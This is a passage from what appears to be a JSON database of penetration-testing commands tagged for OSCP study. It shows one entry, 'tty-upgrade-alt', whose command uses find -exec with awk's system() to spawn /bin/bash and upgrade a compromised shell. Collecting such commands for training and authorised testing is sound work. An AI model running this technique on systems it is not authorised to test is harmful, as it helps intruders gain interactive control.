          "command": "find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;\n"
        }
      ],
      "description": "Upgrade a non-interactive shell to a TTY session using alternative system interpreters.",
      "os": [
        "Linux"
      ],
      "category": [
        "oscp",
        "cli"
      ],
      "phase": [
        "InitialAccess"
      ],
      "references": [
        "https://github.com/zernanvash/cheatsheet/blob/main/guides/Machine%20Exploitation%20Playbook.md#non-python-tty-upgrade-alternatives"
      ],
      "name": "tty-upgrade-alt"
    }
  ]
};
